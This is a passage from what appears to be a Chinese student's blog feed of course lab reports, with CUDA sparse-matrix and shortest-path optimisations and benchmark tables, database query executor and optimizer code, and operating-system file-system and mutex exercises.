keyword">mut</span> mutex_inner <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inner<span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>mutex_inner<span class="token punctuation">.</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span> <span class="token operator">=</span> mutex_inner<span class="token punctuation">.</span>wait_queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">add_task</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            mutex_inner<span class="token punctuation">.</span>locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 答: 二者的区别在于对锁的状态修改. 第一种实现的逻辑是错误的.</p><p> 第一种释放锁时, 可能会被其他线程抢占, 任务不一定持有锁; 第二种将任务加入队列时, 同时实现了锁的继承.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高性能计算导论 Lab 3</title>
      <link href="/2024/06/03/gao-xing-neng-ji-suan-dao-lun-lab-3/"/>
      <url>/2024/06/03/gao-xing-neng-ji-suan-dao-lun-lab-3/</url>
      
        <content type="html"><![CDATA[<h1 id="稀疏矩阵-矩阵乘-大作业-实验报告"><a href="#稀疏矩阵-矩阵乘-大作业-实验报告" class="headerlink" title="稀疏矩阵-矩阵乘 大作业 实验报告"></a>稀疏矩阵-矩阵乘 大作业 实验报告</h1><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><h3 id="preprocess"><a href="#preprocess" class="headerlink" title="preprocess"></a><code>preprocess</code></h3><ul><li>不同矩阵数据集的<strong>稀疏度</strong>不同, 计算稀疏矩阵 $A$ <strong>平均每行非零元的个数</strong>.<ul><li>若平均每行非零元数<strong>较低</strong>:<ul><li>由每个线程块处理 $\mathbf{A}$ 中 64 个非零元.</li><li>利用<strong>共享内存</strong>存储 $\mathbf{A}$ 中非零元素所在行号.</li><li>根据 $K$ 的大小设置为 <code>SPARSE_32</code> 或 <code>SPARSE_256</code> 模式.</li></ul></li><li>若平均每行非零元数<strong>较高</strong>:<ul><li>由每个线程块处理 $\mathbf{A}$ 中 1 行非零元.</li><li>根据 $K$ 的大小设置为 <code>DENSE_32</code> 或 <code>DENSE_256</code> 模式.</li></ul></li></ul></li><li>初始化 <code>vout</code> 为 0, 确保输出结果的正确性.</li></ul><h3 id="run"><a href="#run" class="headerlink" title="run"></a><code>run</code></h3><ul><li><strong>每个线程块</strong>负责计算:<ul><li><code>SPARSE_32</code> 模式: $\mathbf{A}$ 中 64 个非零元与 $\mathbf{B}$ 中 1 列元素的乘积.</li><li><code>SPARSE_256</code> 模式: $\mathbf{A}$ 中 64 个非零元与 $\mathbf{B}$ 中 4 列元素的乘积.</li><li><code>DENSE_32</code> 模式: $\mathbf{A}$ 中 1 行非零元与 $\mathbf{B}$ 中 1 列元素的乘积.</li><li><code>DENSE_256</code> 模式: $\mathbf{A}$ 中 1 行非零元与 $\mathbf{B}$ 中 2 列元素的乘积.</li></ul></li><li><strong>每个线程块</strong>设置 32 个线程, 将上面的计算任务分摊到<strong>每个线程</strong>, 让同一个 Warp 内线程进行相同的工作.</li><li>设置<strong>共享内存</strong>存储稀疏矩阵 $\mathbf{A}$ 的元素, 在线程块内充分利用<strong>寄存器资源</strong>.</li><li>手动展开循环, 并改用<strong>位移运算</strong>实现 $2$ 幂次乘法运算, 提高计算效率.</li></ul><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><ul><li>$K = 32$ 时, 运行时间及加速比如下:</li><li><strong>平均吞吐量</strong>为 $4.52845\times 10^{9}$ nnz/s, 有 13 个达到<strong>加速比</strong>要求.</li></ul><div class="table-container"><table><thead><tr><th>测试集</th><th>spmm_cusparse/us</th><th>spmm_opt/us</th><th>加速比</th></tr></thead><tbody><tr><td><strong>arxiv</strong></td><td>750.658</td><td>462.133</td><td><strong><u>1.624</u></strong></td></tr><tr><td><strong>collab</strong></td><td>1281.46</td><td>651.966</td><td><strong><u>1.966</u></strong></td></tr><tr><td><strong>citation</strong></td><td>16443</td><td>9276.09</td><td><strong><u>1.773</u></strong></td></tr><tr><td><strong>ddi</strong></td><td>641.326</td><td>277.533</td><td><strong><u>2.311</u></strong></td></tr><tr><td><strong>protein</strong></td><td>24664.9</td><td>8190.62</td><td><strong><u>3.011</u></strong></td></tr><tr><td><strong>ppa</strong></td><td>18381.8</td><td>10251.1</td><td><strong><u>1.793</u></strong></td></tr><tr><td><strong>reddit.dgl</strong></td><td>48559</td><td>21516.1</td><td><strong><u>2.257</u></strong></td></tr><tr><td><strong>products</strong></td><td>55819.7</td><td>32036.7</td><td><strong><u>1.742</u></strong></td></tr><tr><td><strong>youtube</strong></td><td>3643.61</td><td>2425.85</td><td><strong><u>1.502</u></strong></td></tr><tr><td><strong>amazon_cogdl</strong></td><td>125240</td><td>53800.3</td><td><strong><u>2.328</u></strong></td></tr><tr><td><strong>yelp</strong></td><td>6574.59</td><td>3602.06</td><td><strong><u>1.825</u></strong></td></tr><tr><td><strong>wikikg2</strong></td><td>7138.26</td><td>3230.56</td><td><strong><u>2.210</u></strong></td></tr><tr><td><strong>am</strong></td><td>3741.58</td><td>2243.36</td><td><strong><u>1.668</u></strong></td></tr></tbody></table></div><ul><li>$K = 256$ 时, 运行时间及加速比如下:</li><li><strong>平均吞吐量</strong>为 $6.44827\times 10^{8}$ nnz/s, 有 10 个达到<strong>加速比</strong>要求.</li></ul><div class="table-container"><table><thead><tr><th>测试集</th><th>spmm_cusparse/us</th><th>spmm_opt/us</th><th>加速比</th></tr></thead><tbody><tr><td><strong>arxiv</strong></td><td>2990.24</td><td>2694.47</td><td><strong><u>1.110</u></strong></td></tr><tr><td><strong>collab</strong></td><td>5204.38</td><td>4437.61</td><td><strong><u>1.173</u></strong></td></tr><tr><td><strong>citation</strong></td><td>78943.5</td><td>69097.1</td><td><strong><u>1.143</u></strong></td></tr><tr><td><strong>ddi</strong></td><td>1562.93</td><td>1587.49</td><td>0.985</td></tr><tr><td><strong>protein</strong></td><td>80862.7</td><td>67908.9</td><td><strong><u>1.191</u></strong></td></tr><tr><td><strong>ppa</strong></td><td>84946.6</td><td>80882.5</td><td><strong><u>1.050</u></strong></td></tr><tr><td><strong>reddit.dgl</strong></td><td>202263</td><td>182988</td><td><strong><u>1.105</u></strong></td></tr><tr><td><strong>products</strong></td><td>258319</td><td>247208</td><td><strong><u>1.045</u></strong></td></tr><tr><td><strong>youtube</strong></td><td>14394.4</td><td>14886.4</td><td>0.967</td></tr><tr><td><strong>amazon_cogdl</strong></td><td>517165</td><td>435827</td><td><strong><u>1.187</u></strong></td></tr><tr><td><strong>yelp</strong></td><td>29985.7</td><td>26834.4</td><td><strong><u>1.117</u></strong></td></tr><tr><td><strong>wikikg2</strong></td><td>16638.8</td><td>19490.7</td><td>0.854</td></tr><tr><td><strong>am</strong></td><td>13388.7</td><td>12281.9</td><td><strong><u>1.090</u></strong></td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> HPC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> High Performance Computing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库专题训练 Lab 5</title>
      <link href="/2024/05/21/shu-ju-ku-zhuan-ti-xun-lian-lab-5/"/>
      <url>/2024/05/21/shu-ju-ku-zhuan-ti-xun-lian-lab-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-5-查询优化"><a href="#Lab-5-查询优化" class="headerlink" title="Lab 5 查询优化"></a>Lab 5 查询优化</h1><h2 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h2><h3 id="查询重写"><a href="#查询重写" class="headerlink" title="查询重写"></a>查询重写</h3><p><strong>分解复合的选择谓词</strong>见 <code>Optimizer::SplitPredicates</code>.</p><ul><li>遍历查询计划树, 若查询树的节点为 <code>Filter</code> 类型, 对应的谓词为 <code>LOGIC</code> 类型, 且逻辑表达式为 <code>AND</code> 类型, 则将谓词的左右子表达式作为新的 <code>Filter</code> 节点添加到查询计划树中, 同时维护节点间的父子关系.</li></ul><p><strong>下推选择运算</strong>见 <code>Optimizer::PushDownFilter</code> 与 <code>Optimizer::PushDownSeqScan</code>.</p><ul><li>对于 <code>Filter</code> 类型的节点, 若谓词为 <code>Comparison</code> 且为 <code>ColumnValue</code> 和 <code>ColumnValue</code> 的比较, 则为连接谓词, 将其保存到 <code>Optimizer</code> 类的成员变量 <code>std::vector&lt;FilterOperator&gt; join_filters_</code> 中; 否则为普通谓词, 将其保存到成员变量 <code>std::vector&lt;FilterOperator&gt; simple_filters_</code> 中. 注意对子节点递归调用 <code>PushDown</code>.</li><li>通过 <code>Operator::OutputColumns().GetColumns()</code> 获取当前 <code>SeqScan</code> 节点的全部列名,  判断成员变量保存的普通谓词是否使用这些列, 并在此 <code>SeqScan</code> 节点上方添加 <code>Filter</code> 节点.</li></ul><p><strong>笛卡尔积转连接</strong>见 <code>Optimizer::PushDownJoin</code>.</p><ul><li>对 <code>NestedLoopJoin</code> 节点通过 <code>Operator::OutputColumns().GetColumns()</code> 获取当前 <code>SeqScan</code> 节点的全部列名,  判断成员变量保存的连接谓词是否可以用于该节点, 如果有将连接谓词添加到该节点的 <code>join_condition</code>, 实现笛卡尔积到连接的转换.</li></ul><h3 id="基于贪心算法的连接顺序选择"><a href="#基于贪心算法的连接顺序选择" class="headerlink" title="基于贪心算法的连接顺序选择"></a>基于贪心算法的连接顺序选择</h3><p><strong>基于贪心算法的连接顺序选择</strong>见 <code>Optimizer::ReorderJoin</code>.</p><ul><li><p>使用如下结构体存储当前表的元信息:</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct TableInfo { public:  std::string name;  uint32_t cardinality;  std::unordered_set&lt;std::string&gt; columns;  std::unordered_map&lt;std::string, uint32_t&gt; distinct;  SeqScanOperator seq_scan;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>递归扫描查询计划树, 记录所有 <code>SeqScan</code> 节点和 <code>NestedLoopJoin</code> 节点, 将 <code>SeqScan</code> 节点对应的表格元信息存储在 <code>table_infos</code> 中, 通过贪心算法对 <code>table_infos</code> 进行重排序. 从其中记录的 <code>SeqScan</code> 节点自底向上依次构建 <code>NestedLoopJoin</code> 节点, 并替换原始的以 <code>NestedLoopJoin</code> 节点为根的子树.</p></li></ul><h2 id="实验耗时"><a href="#实验耗时" class="headerlink" title="实验耗时"></a>实验耗时</h2><ol><li>基础功能<ul><li>查询重写: 2h.</li><li>基于贪心算法的连接顺序选择: 3.5h.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 Lab 4</title>
      <link href="/2024/05/19/cao-zuo-xi-tong-lab-4/"/>
      <url>/2024/05/19/cao-zuo-xi-tong-lab-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-4"><a href="#Lab-4" class="headerlink" title="Lab 4"></a>Lab 4</h1><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="sys-linkat"><a href="#sys-linkat" class="headerlink" title="sys_linkat"></a><code>sys_linkat</code></h3><blockquote><p>参考 <code>Inode::create()</code> 的实现.</p></blockquote><ol><li>为 <code>DiskInode</code> 添加 <code>nlink</code> 字段, 初始化时设置为 <code>1</code>.</li><li>为 <code>Inode</code> 实现 <code>linkat()</code> 方法, 保证仅由 <code>ROOT_INODE</code> 调用.</li><li>由 <code>read_disk_inode()</code> 获取 <code>old_name</code> 对应的 <code>inode_id</code>.</li><li>由 <code>EasyFileSystem</code> 解析出 <code>block_id</code> 与 <code>block_offset</code>.</li><li>由 <code>get_block_cache()</code> 建立链接并插入新建的 <code>DirEntry</code>.</li></ol><h3 id="sys-unlinkat"><a href="#sys-unlinkat" class="headerlink" title="sys_unlinkat"></a><code>sys_unlinkat</code></h3><blockquote><p>参考 <code>Inode::clear()</code> 的实现.</p></blockquote><ol><li>为 <code>Inode</code> 实现 <code>unlinkat()</code> 方法, 保证仅由 <code>ROOT_INODE</code> 调用.</li><li>由 <code>read_disk_inode()</code> 遍历根目录获取 <code>name</code> 对应的 <code>inode_id</code>.</li><li>由 <code>modify_disk_inode()</code> 修改 <code>DiskInode</code>, 删除相应目录项.</li><li>由 <code>EasyFileSystem</code> 解析出 <code>block_id</code> 与 <code>block_offset</code>.</li><li>由 <code>get_block_cache()</code> 解除链接, 并判断是否需要释放数据块.</li></ol><h3 id="sys-fstat"><a href="#sys-fstat" class="headerlink" title="sys_fstat"></a><code>sys_fstat</code></h3><ol><li>为 <code>File</code> trait 定义 <code>stat()</code> 方法, 传入 <code>*mut Stat</code> 作为参数.</li><li>仅为 <code>OSInode</code> 实现该方法, 在 <code>Stdin</code> 与 <code>Stdout</code> 中默认 <code>panic</code> 退出.</li><li>手动查询页表, 将传入的 <code>st: *mut Stat</code> 虚拟地址转换为对应的物理地址.</li><li><code>ino</code> 字段由 <code>EasyFileSystem</code> 计算并给出.</li><li><code>mode</code> 与 <code>nlink</code> 字段通过 <code>Inode::read_disk_inode()</code> 获取对应的 <code>DiskInode</code> 并给出.</li></ol><h2 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h2><ol><li><p><strong>在 easy-fs 中 root inode 起着什么作用? 如果 root inode 中的内容损坏会发生什么?</strong></p><p> 答: (1) 仅支持绝对路径的情况下, root inode 作为根目录所对应的 <code>Inode</code>, 是文件系统的起点, 对任何文件/目录的索引必须从 root inode 开始向下逐级进行, 相关文件方法只能由 root inode 调用. (2) 如果 root inode 中的内容损坏, 那么文件系统将无法实现文件管理.</p></li></ol><ol><li><p><strong>举出使用 pipe 的一个实际应用的例子.</strong></p><p> 答: 以使用如下命令进行文件行数统计为例:</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> example.txt <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 操作系统捕获第一个命令的输出, 暂存在内存中, 并直接连接到第二个命令的输入, 形成一个管道, 无需将中间结果写入临时文件或手动多次执行命令.</p></li></ol><ol><li><p><strong>如果需要在多个进程间互相通信, 则需要为每一对进程建立一个管道, 非常繁琐, 请设计一个更易用的多进程通信机制.</strong></p><p> 答: 由操作系统设置一个消息队列进行多进程通信, 允许一个进程将数据发送到队列中, 设置发送方标识与期待接收方标识, 另一个进程从队列中读取数据, 通过标识符判断是否可接收. 比较成熟的消息队列中间件有 ActiveMQ, RabbitMQ, RocketMQ 等.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高性能计算导论 Lab 2</title>
      <link href="/2024/05/08/gao-xing-neng-ji-suan-dao-lun-lab-2/"/>
      <url>/2024/05/08/gao-xing-neng-ji-suan-dao-lun-lab-2/</url>
      
        <content type="html"><![CDATA[<h1 id="全源最短路-大作业-实验报告"><a href="#全源最短路-大作业-实验报告" class="headerlink" title="全源最短路 大作业 实验报告"></a>全源最短路 大作业 实验报告</h1><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>实现了实验指导书的<strong>三阶段分块全源最短路算法</strong>, 并实现了<strong>二级分块优化策略</strong>:</p><ul><li><strong>一级分块</strong>以 $48$ 为步长, 将 $n\times n$ 大小的矩阵分为 $48\times 48$ 大小的一级块, 每个一级块由<strong>一个线程块</strong>进行处理, 存储在<strong>共享内存</strong>中.</li><li><strong>二级分块</strong>以 $3$ 为步长, 将 $48\times 48$ 大小的一级块分为 $3\times 3$ 大小的二级块, 每个二级块由<strong>一个线程</strong>进行处理, 存储在<strong>寄存器</strong>中.</li></ul><h3 id="kernel1-lt-lt-lt-blk1-thr-gt-gt-gt"><a href="#kernel1-lt-lt-lt-blk1-thr-gt-gt-gt" class="headerlink" title="kernel1<<<blk1, thr>>>"></a><code>kernel1&lt;&lt;&lt;blk1, thr&gt;&gt;&gt;</code></h3><p>分配 $1$ 个线程块 <code>blk1</code>, 每个线程块包含 $16\times 16$ 个线程 <code>thr</code>.</p><p>设置<strong>共享内存</strong>存储中心块数据, 在中心块内部执行 Floyd-Warshall 算法:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__shared__ int cen_block[FIRST_BLOCK_LEN][FIRST_BLOCK_LEN];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="kernel2-lt-lt-lt-blk2-thr-gt-gt-gt"><a href="#kernel2-lt-lt-lt-blk2-thr-gt-gt-gt" class="headerlink" title="kernel2<<<blk2, thr>>>"></a><code>kernel2&lt;&lt;&lt;blk2, thr&gt;&gt;&gt;</code></h3><p>分配 $N\times 2$ 个线程块 <code>blk2</code>, 每个线程块包含 $16\times 16$ 个线程 <code>thr</code>.</p><p>设置<strong>共享内存</strong>存储中心块、十字块数据, 设置<strong>局部内存</strong>存储二级块数据, 用中心块的结果和十字块中原本的其他结果更新十字块:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__shared__ int cen_block[FIRST_BLOCK_LEN][FIRST_BLOCK_LEN];__shared__ int cross_block[FIRST_BLOCK_LEN][FIRST_BLOCK_LEN];           int local_block[SECOND_BLOCK_LEN][SECOND_BLOCK_LEN];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="kernel3-lt-lt-lt-blk3-thr-gt-gt-gt"><a href="#kernel3-lt-lt-lt-blk3-thr-gt-gt-gt" class="headerlink" title="kernel3<<<blk3, thr>>>"></a><code>kernel3&lt;&lt;&lt;blk3, thr&gt;&gt;&gt;</code></h3><p>分配 $N\times N$ 个线程块 <code>blk3</code>, 每个线程块包含 $16\times 16$ 个线程 <code>thr</code>.</p><p>设置<strong>共享内存</strong>存储十字块、剩余块数据, 设置<strong>局部内存</strong>存储二级块数据, 用十字块的结果更新剩余的块:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__shared__ int cross_x_block[FIRST_BLOCK_LEN][FIRST_BLOCK_LEN];__shared__ int cross_y_block[FIRST_BLOCK_LEN][FIRST_BLOCK_LEN];__shared__ int rest_block[FIRST_BLOCK_LEN][FIRST_BLOCK_LEN];           int local_block[SECOND_BLOCK_LEN][SECOND_BLOCK_LEN];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><div class="table-container"><table><thead><tr><th>$n$</th><th>1000</th><th>2500</th><th>5000</th><th>7500</th><th>10000</th></tr></thead><tbody><tr><td><code>apsp_ref.cu</code></td><td>15.416 ms</td><td>377.811 ms</td><td>2986.876 ms</td><td>10051.554 ms</td><td>22835.954 ms</td></tr><tr><td><code>apsp.cu</code></td><td>1.400 ms</td><td>11.516 ms</td><td>77.646 ms</td><td>255.279 ms</td><td>556.766 ms</td></tr><tr><td>加速比</td><td>11.01</td><td>32.81</td><td>38.47</td><td>39.37</td><td>41.02</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> HPC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> High Performance Computing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库专题训练 Lab 4</title>
      <link href="/2024/05/07/shu-ju-ku-zhuan-ti-xun-lian-lab-4/"/>
      <url>/2024/05/07/shu-ju-ku-zhuan-ti-xun-lian-lab-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-4-查询处理"><a href="#Lab-4-查询处理" class="headerlink" title="Lab 4 查询处理"></a>Lab 4 查询处理</h1><h2 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h2><h3 id="Limit-算子"><a href="#Limit-算子" class="headerlink" title="Limit 算子"></a>Limit 算子</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* executors/limit_executor.h */class LimitExecutor : public Executor { private:  uint32_t limit_;  uint32_t offset_;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* executors/limit_executor.cpp */std::shared_ptr&lt;Record&gt; LimitExecutor::Next() {  // 通过 plan_ 获取 limit 语句中的 offset 和 limit 值  auto offset = plan_-&gt;limit_offset_.value_or(0);  auto limit = plan_-&gt;limit_count_.value_or(UINT32_MAX);  while (auto record = children_[0]-&gt;Next()) {    // 设置开始输出的记录位置    if (offset_++ &lt; offset) {      continue;    }    // 限制输出的记录数    if (limit_++ &lt; limit) {      return record;    }    break;  }  return nullptr;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="排序算子"><a href="#排序算子" class="headerlink" title="排序算子"></a>排序算子</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* executors/orderby_executor.h */struct order_pair {  std::vector&lt;std::pair&lt;Value, OrderByType&gt;&gt; values_;  std::shared_ptr&lt;Record&gt; record_;};bool compare(const order_pair &amp;a, const order_pair &amp;b);class OrderByExecutor : public Executor { private:  std::vector&lt;order_pair&gt; records_;  bool sorted_ = false;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* executors/orderby_executor.cpp */bool compare(const order_pair &amp;a, const order_pair &amp;b) {  // 根据 OrderByType 进行排序，传入 std::sort 函数  for (size_t i = 0; i &lt; a.values_.size(); i++) {    // 通过 Value 的 Less, Equal, Greater 函数比较 Value 的值    if (a.values_[i].first.Equal(b.values_[i].first)) {      continue;    }    if (a.values_[i].second == OrderByType::DESC) {      return a.values_[i].first.Less(b.values_[i].first);    }    else {      return a.values_[i].first.Greater(b.values_[i].first);    }  }  return false;}std::shared_ptr&lt;Record&gt; OrderByExecutor::Next() {  // 排序阶段  if (!sorted_) {    auto records = std::vector&lt;order_pair&gt;();    while (auto record = children_[0]-&gt;Next()) {      std::vector&lt;std::pair&lt;Value, OrderByType&gt;&gt; values;      for (auto &amp;order_by: plan_-&gt;order_bys_) {        // 通过 OperatorExpression 的 Evaluate 函数获取 Value 的值        auto value = order_by.second-&gt;Evaluate(record);        auto type = order_by.first;        values.push_back(std::make_pair(value, type));      }      records.push_back(order_pair{values, record});    }    // 使用 STL 的 sort 函数    std::sort(records.begin(), records.end(), compare);    records_ = std::move(records);    sorted_ = true;  }  // 输出阶段  if (records_.size() &gt; 0) {    auto record = records_.back().record_;    records_.pop_back();    return record;  }  return nullptr;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="嵌套循环连接算子"><a href="#嵌套循环连接算子" class="headerlink" title="嵌套循环连接算子"></a>嵌套循环连接算子</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* executors/nested_loop_join_executor.h */class NestedLoopJoinExecutor : public Executor { private:  std::vector&lt;std::shared_ptr&lt;Record&gt;&gt; first_records_;  std::vector&lt;std::shared_ptr&lt;Record&gt;&gt; second_records_;  std::vector&lt;std::shared_ptr&lt;Record&gt;&gt; records_;  bool joined_ = false;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* executors/nested_loop_join_executor.cpp */std::shared_ptr&lt;Record&gt; NestedLoopJoinExecutor::Next() {  // 连接阶段  if (!joined_) {    while (auto record = children_[0]-&gt;Next()) {      first_records_.push_back(record);    }    while (auto record = children_[1]-&gt;Next()) {      second_records_.push_back(record);    }    // 二重嵌套循环连接    for (auto &amp;first_record : first_records_) {      for (auto &amp;second_record : second_records_) {        // 从 NestedLoopJoinOperator 中获取连接条件        if (plan_-&gt;join_type_ == JoinType::INNER) {          // 使用 EvaluateJoin 函数判断是否满足 join 条件          auto value = plan_-&gt;join_condition_-&gt;EvaluateJoin(first_record, second_record).GetValue&lt;bool&gt;();          if (value) {            // 使用 Record 的 Append 函数进行记录的连接            auto record = std::make_shared&lt;Record&gt;();            record-&gt;Append(*first_record);            record-&gt;Append(*second_record);            // 将连接后的记录加入到 records_ 中            records_.push_back(record);          }        }      }    }    joined_ = true;  }  // 输出阶段  if (records_.size() &gt; 0) {    auto record = records_.back();    records_.pop_back();    return record;  }  return nullptr;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="归并连接算子"><a href="#归并连接算子" class="headerlink" title="归并连接算子"></a>归并连接算子</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* executors/merge_join_executor.h */class MergeJoinExecutor : public Executor { private:  std::list&lt;std::shared_ptr&lt;Record&gt;&gt; first_records_;  std::list&lt;std::shared_ptr&lt;Record&gt;&gt; second_records_;  std::list&lt;std::shared_ptr&lt;Record&gt;&gt; records_;  bool joined_ = false;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* executors/merge_join_executor.cpp */std::shared_ptr&lt;Record&gt; MergeJoinExecutor::Next() {  // 连接阶段  if (!joined_) {    while (auto record = children_[0]-&gt;Next()) {      first_records_.push_back(record);    }    while (auto record = children_[1]-&gt;Next()) {      second_records_.push_back(record);    }    if (plan_-&gt;join_type_ == JoinType::INNER) {      auto first_record = first_records_.front();      auto second_record = second_records_.front();      while (first_records_.size() &gt; 0 &amp;&amp; second_records_.size() &gt; 0) {        // 不满足 join 条件，跳过相应记录        if (plan_-&gt;left_key_-&gt;Evaluate(first_record).Less(plan_-&gt;right_key_-&gt;Evaluate(second_record))) {          first_records_.pop_front();          first_record = first_records_.front();          continue;        }        // 不满足 join 条件，跳过相应记录        if (plan_-&gt;left_key_-&gt;Evaluate(first_record).Greater(plan_-&gt;right_key_-&gt;Evaluate(second_record))) {          second_records_.pop_front();          second_record = second_records_.front();          continue;        }        // 满足 join 条件        while (plan_-&gt;left_key_-&gt;Evaluate(first_record).Equal(plan_-&gt;right_key_-&gt;Evaluate(second_record))) {          auto second_record_iter = second_records_.begin();          // 查询重复元组          while (plan_-&gt;left_key_-&gt;Evaluate(first_record).Equal(plan_-&gt;right_key_-&gt;Evaluate(*second_record_iter))) {            // 使用 Record 的 Append 函数进行记录的连接            auto record = std::make_shared&lt;Record&gt;();            record-&gt;Append(*first_record);            record-&gt;Append(**second_record_iter);            // 将连接后的记录加入到 records_ 中            records_.push_back(record);            // 遍历 second_records_ 直到为空            if (++second_record_iter == second_records_.end()) {              break;            }          }          // 遍历 first_records_ 直到为空          first_records_.pop_front();          if (first_records_.size() == 0) {            break;          }          first_record = first_records_.front();        }      }    }    joined_ = true;  }  // 输出阶段  if (records_.size() &gt; 0) {    auto record = records_.back();    records_.pop_back();    return record;  }  return nullptr;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h3><h4 id="设计思路"><a href="#设计思路" class="headerlink" 